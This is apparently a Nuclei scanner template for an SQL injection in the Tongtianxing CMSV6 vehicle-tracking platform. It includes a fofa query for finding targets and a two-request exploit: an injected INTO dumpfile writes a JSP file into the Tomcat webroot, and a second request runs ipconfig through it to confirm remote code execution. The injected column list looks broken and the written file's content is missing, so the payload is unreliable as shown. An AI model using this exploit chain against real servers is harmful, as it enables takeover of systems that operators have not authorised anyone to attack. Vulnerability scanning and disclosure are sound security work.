id: tongtianxingCMSV6-point_manage_merge-sql-RCE

info:
  name: 通天星CMSV6车载定位监控平台 point_manage/merge SQL注入致RCE
  author: Superhero
  severity: high
  description: |-
    fofa: body="/808gps/"
    2024年5月，通天星CMSV6发布新版本修复了一处SQL注入漏洞。漏洞是由于通天星CMSV6车载定位监控平台未对用户的输入进行预编译，直接将其拼接进了SQL查询语句中，导致系统出现SQL注入漏洞。该漏洞可通过SQL注入实现文件写入进行远程代码执行，获取服务器权限。建议及时修复漏洞。
  reference:
    - https://blog.csdn.net/m0_60571842/article/details/139937883
  tags: sql injection

http:
  - raw:
      - |
        POST /point_manage/merge HTTP/1.1 
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        id=1&name=1' UNION SELECT%0aNULL, ,NULL,NULL,NULL,NULL,NULL,NULL
        INTO dumpfile '../../tomcat/webapps/gpsweb/test.jsp' FROM user_session a
        WHERE '1 '='1 &type=3&map_id=4&install_place=5&check_item=6&create_time=7&update_time=8

      - |
        GET /test.jsp?cmd=ipconfig HTTP/1.1
        Host: {{Hostname}}
    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - 'Windows IP'
      - type: status
        status: 
          - 200




